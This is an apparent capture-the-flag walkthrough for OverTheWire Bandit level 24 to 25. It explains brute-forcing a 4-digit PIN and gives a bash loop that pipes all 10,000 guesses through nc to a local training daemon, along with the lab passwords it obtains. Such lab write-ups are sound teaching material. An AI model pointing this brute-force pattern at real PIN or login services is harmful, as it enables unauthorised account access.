# 🔓 Level 24 → Level 25 — Brute-Forcing a PIN Code

## 📊 Level Info

| Property | Value |
|----------|-------|
| **Host** | `bandit.labs.overthewire.org` |
| **Port** | `2220` |
| **Username** | `bandit24` |
| **Password** | `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8` (from Level 23) |

---

## 🎯 Challenge

> A daemon is listening on port **30002** and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
>
> You do not need to create new connections each time.

**Commands you may need:** `ssh`, `nc`, `cat`, `bash`, `screen`, `tmux`, `for` loops, `while` loops

---

## 🧠 Understanding the Challenge

This level introduces **brute-forcing** - trying all possible combinations until one works.

### The Setup

There's a service running on port `30002` that:
- Expects input in the format: `[bandit24_password] [4-digit_pincode]`
- If the pincode is correct, it returns the password for bandit25
- If incorrect, it returns an error message

### The Numbers

- 4-digit pincode ranges from `0000` to `9999`
- That's **10,000 possible combinations**
- We need to try them all

### Optimization

The note says: *"You do not need to create new connections each time"*

This means we can:
1. Open ONE connection to the service
2. Send multiple attempts through the same connection
3. This is much faster than opening 10,000 separate connections

---

## 💡 Solution

### Step 1: Connect to Level 24

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
Step 2: Create a working directory in /tmp
bash

bandit24@bandit:~$ cd /tmp
bandit24@bandit:/tmp$ mkdir bandit24brute
bandit24@bandit:/tmp$ cd bandit24brute

Step 3: Create a brute-force script
bash

bandit24@bandit:/tmp/bandit24brute$ cat > brute.sh << 'EOF'
#!/bin/bash

PASSWORD="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for PIN in {0000..9999}; do
    echo "$PASSWORD $PIN"
done | nc localhost 30002 | grep -v "Wrong"
EOF

Step 4: Make the script executable
bash

bandit24@bandit:/tmp/bandit24brute$ chmod +x brute.sh

Step 5: Run the brute-force script
bash

bandit24@bandit:/tmp/bandit24brute$ ./brute.sh

Output:
text

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

Step 6: Save the password
bash

echo "bandit25: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4" >> ~/bandit_notes.txt

Step 7: Log into Level 25
bash

ssh bandit25@bandit.labs.overthewire.org -p 2220

Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
